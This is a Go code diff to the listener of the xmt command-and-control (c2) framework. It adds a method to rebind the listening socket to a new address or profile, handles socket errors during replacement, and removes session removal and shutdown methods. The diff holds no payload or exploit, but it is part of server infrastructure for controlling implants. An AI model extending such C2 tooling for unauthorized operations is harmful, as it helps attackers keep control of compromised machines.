@@ -4,14 +4,15 @@ package c2
 
 import (
 	"context"
+	"errors"
 	"io"
 	"net"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
-	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
+	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
 var _ connServer = (*Listener)(nil)
@@ -28,7 +29,6 @@ type Listener struct {
 	ch     chan struct{}
 	cancel context.CancelFunc
 	name   string
-	sleep  time.Duration
 	state  state
 }
 
@@ -53,10 +53,24 @@ func (l *Listener) listen() {
 		if l.state.Closing() {
 			break
 		}
+		if l.listener == nil && l.state.Replacing() {
+			time.Sleep(time.Millisecond * 30) // Prevent CPU buring loops.
+			continue
+		}
 		c, err := l.listener.Accept()
 		if err != nil {
+			if l.state.Replacing() {
+				continue
+			}
 			if l.state.Closing() {
 				break
+			}
+			if errors.Is(err, net.ErrClosed) {
+				// NOTE(dij): Catch the socket being replaced, this should
+				//            only happen when replacement occurs, if we ARE
+				//            closing or the ctx was cancled, continue and
+				//            that /should/ be hit at the top of the loop.
+				continue
 			}
 			e, ok := err.(net.Error)
 			if ok && e.Timeout() {
@@ -104,7 +118,10 @@ func (l *Listener) Close() error {
 	}
 	l.state.Set(stateClosing)
 	l.cancel()
-	err := l.listener.Close()
+	var err error
+	if !l.state.Replacing() {
+		err = l.listener.Close()
+	}
 	<-l.ch
 	return err
 }
@@ -134,18 +151,6 @@ func (l *Listener) Address() string {
 func (l *Listener) wrapper() Wrapper {
 	return l.w
 }
-
-// Remove removes and closes the Session and releases all it's associated
-// resources.
-//
-// This does not close the Session on the client's end, use the Shutdown
-// function to properly shutdown the client process.
-func (l *Listener) Remove(i device.ID) {
-	if l.state.WakeClosed() || l.s == nil {
-		return
-	}
-	l.s.delSession <- i.Hash()
-}
 func (l *Listener) clientClear(i uint32) {
 	v, ok := l.s.sessions[i]
 	if !ok {
@@ -153,29 +158,6 @@ func (l *Listener) clientClear(i uint32) {
 	}
 	v.chn = nil
 	v.state.Unset(stateChannelProxy)
-}
-func (l *Listener) tryRemove(s *Session) {
-	if l.s == nil || l.state.WakeClosed() {
-		return
-	}
-	l.s.delSession <- s.ID.Hash()
-}
-
-// Shutdown triggers a remote Shutdown and closure of the Session associated
-// with the Device ID.
-//
-// This will not immediately close a Session. The Session will be removed when
-// the Client acknowledges the shutdown request.
-func (l *Listener) Shutdown(i device.ID) {
-	if l.state.WakeClosed() {
-		return
-	}
-	l.s.lock.RLock()
-	s, ok := l.s.sessions[i.Hash()]
-	if l.s.lock.RUnlock(); !ok {
-		return
-	}
-	s.Close()
 }
 func (l *Listener) transform() Transform {
 	return l.t
@@ -190,6 +172,42 @@ func (l *Listener) Done() <-chan struct{} {
 func (l *Listener) clientGet(i uint32) (connHost, bool) {
 	s, ok := l.s.sessions[i]
 	return s, ok
+}
+
+// Replace allows for rebinding this Listener to another address or using
+// another Profile without closing the Listener.
+//
+// The listening socket will be closed and the Listener will be paused and
+// cannot accept any more connections before being reopened.
+//
+// If the replacement fails, the Listener will be closed.
+func (l *Listener) Replace(addr string, p Profile) error {
+	if p == nil {
+		return ErrInvalidProfile
+	}
+	h, w, t := p.Next()
+	if len(addr) > 0 {
+		h = addr
+	}
+	if len(h) == 0 {
+		return ErrNoHost
+	}
+	l.state.Set(stateReplacing)
+	l.listener.Close()
+	l.listener = nil
+	v, err := p.Listen(l.ctx, h)
+	if err != nil {
+		l.Close()
+		return xerr.Wrap("unable to listen", err)
+	} else if v == nil {
+		l.Close()
+		return xerr.Sub("unable to listen", 0x8)
+	}
+	l.listener, l.w, l.t, l.p = v, w, t, p
+	if l.state.Unset(stateReplacing); cout.Enabled {
+		l.log.Info("[%s] Replaced listener socket, now bound to %s!", l.name, h)
+	}
+	return nil
 }
 func (l *Listener) clientSet(i uint32, c chan *com.Packet) {
 	v, ok := l.s.sessions[i]
@@ -249,7 +267,7 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 			return &conn{next: &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}}, nil
 		}
 		s = &Session{
-			ch:         make(chan struct{}, 1),
+			ch:         make(chan struct{}),
 			ID:         n.Device,
 			jobs:       make(map[uint16]*Job),
 			send:       make(chan *com.Packet, 256),
@@ -345,7 +363,7 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 			return nil, 0, &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}, nil
 		}
 		s = &Session{
-			ch:         make(chan struct{}, 1),
+			ch:         make(chan struct{}),
 			ID:         n.Device,
 			jobs:       make(map[uint16]*Job),
 			send:       make(chan *com.Packet, 256),
